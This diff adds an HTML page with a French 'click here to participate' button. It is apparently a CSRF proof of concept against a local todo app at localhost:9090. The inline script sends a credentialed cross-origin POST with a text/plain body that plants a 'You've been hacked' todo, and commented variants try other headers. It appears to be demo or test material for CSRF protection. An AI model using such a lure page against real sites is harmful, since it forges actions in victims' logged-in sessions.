@@ -1,0 +1,25 @@
+
+    <div class="watchedContainer">
+
+        <div class="row">
+
+            <legend>Cliquer sur le bouton pour participer</legend>
+
+            <script>
+                function put() {
+                    var x = new XMLHttpRequest();
+                    x.open("POST","https://localhost:9090/myapp/todos",true);
+                    x.withCredentials = true;
+                    x.setRequestHeader("Content-Type", "text/plain");
+//                    x.setRequestHeader("Content-Type", "application/json");
+                    // x.setRequestHeader("X-Requested-By", "XMLHttpRequest");
+
+                    x.send(JSON.stringify({userId: 1, summary: "Hacked", description: "You've been hacked (CSRF issue)"}));
+                    // x.send(JSON.stringify({"userId": 2, "summary": "hack hack", "description": "test pour csrf hacking hacking"}));
+                }
+            </script>
+
+            <a class="btn btn-default" onclick="put()" >Cliquez ici</a>
+
+        </div>
+    </div>
